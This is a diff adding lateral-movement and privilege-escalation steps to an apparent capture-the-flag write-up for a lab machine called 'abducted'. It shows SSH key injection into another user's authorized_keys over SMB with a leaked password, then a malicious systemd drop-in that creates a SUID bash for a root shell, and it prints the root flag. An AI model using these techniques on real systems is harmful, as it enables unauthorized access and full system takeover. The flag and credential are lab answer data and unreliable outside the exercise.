@@ -249,49 +249,146 @@ scott@abducted:~$ cat user.txt
 
 
 
+##  Lateral Movement - SMB to SSH Access (User `marcus`)
 
----
+### Generating SSH Keys
 
+We need an SSH keypair to gain access to the server. We generate a new RSA key with no passphrase for ease of use.
 
-
+```bash
+ssh-keygen -t rsa -b 4096
+```
 
 ![[Pasted image 20260901154325.png]]
 
 
+### Accessing the Transfer Share
 
+Using the credentials extracted from the `rclone` config, we can access the `transfer` share. The credential we found is `svc-backup:iXzvcib3SRpZ`, but we will authenticate as `scott` which maps to the same password.
 
+```bash
+smbclient //10.129.244.177/transfer -U scott%iXzvcib3SRpZ
+```
 
 ![[Pasted image 20260901154707.png]]
 
+### Finding the `marcus` User
+
+Inside the share, we find a directory belonging to a user named `marcus`. We navigate to his `.ssh` folder to see if we can inject our public key.
+
+```bash
+smb: \> cd marcus
+smb: \marcus\> ls
+smb: \marcus\> cd .ssh
+```
 
 
+### Injecting SSH Keys
+
+We upload our generated public key (`id_rsa.pub`) to overwrite the `authorized_keys` file for the `marcus` user, granting us SSH access.
+
+```bash
+smb: \marcus\.ssh\> put /home/thunder/.ssh/id_rsa.pub authorized_keys
+```
 
 ![[Pasted image 20260901154726.png]]
 
 
+### SSH Access as `marcus`
 
+We log into the machine using our private key.
+```bash
+ssh -i ~/.ssh/id_rsa marcus@10.129.244.177
+```
 
 ![[Pasted image 20260901154820.png]]
 
 
 
+
+---
+
+
+## Step 7: Privilege Escalation - Exploiting `operators` Group
+
+### Group Enumeration
+
+We run the `id` command to check our group memberships and find we are part of the `operators` group.
+
+```bash
+marcus@abducted:~$ id
+uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
+```
+
 ![[Pasted image 20260901160451.png]]
 
 
+### Finding Writable System Directories
+
+We check permissions on system service directories and find that `operators` has write access to the SMB service drop-in directory.
+
+```bash
+marcus@abducted:~$ ls -ld /etc/systemd/system/smbd.service.d/
+drwxrws--- 2 root operators 4096 Jun  4 13:41 /etc/systemd/system/smbd.service.d/
+```
 
 ![[Pasted image 20260901160539.png]]
 
 
+### Exploiting Systemd Drop-in
+
+We create a malicious drop-in configuration file. Because it belongs to the `smbd` service, it will run as root when the service starts.
+
+```bash
+cd /etc/systemd/system/smbd.service.d/
+echo -e '[Service]\nExecStartPre=/bin/bash -c "cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf"' | tee 0xdf.conf
+```
 
 ![[Pasted image 20260901160602.png]]
 
 
+### Triggering the Payload
+
+We reload the daemon and restart the service to execute our command.
+```bash
+systemctl daemon-reload
+systemctl restart smbd
+```
 
 ![[Pasted image 20260901160618.png]]
 
 
+### Root Shell
+
+The `smbd` service has created `/tmp/0xdf` with SUID permissions. We execute it with the `-p` flag to spawn a root shell.
+
+```bash
+/tmp/0xdf -p
+0xdf-5.2# id
+uid=0(root) gid=0(root)
+```
+
+### Root Flag
+
+Finally, we read the root flag!
+```bash
+0xdf-5.2# cat /root/root.txt
+0c718415b097adbc7e740fac1b407715
+```
 
 ![[Pasted image 20260901160638.png]]
 
+
+
+---
+
+## Step 8: Machine Owned
+
+![[Pasted image 20260904074358.png|700]]
+
+
+
+---
+---
 
 
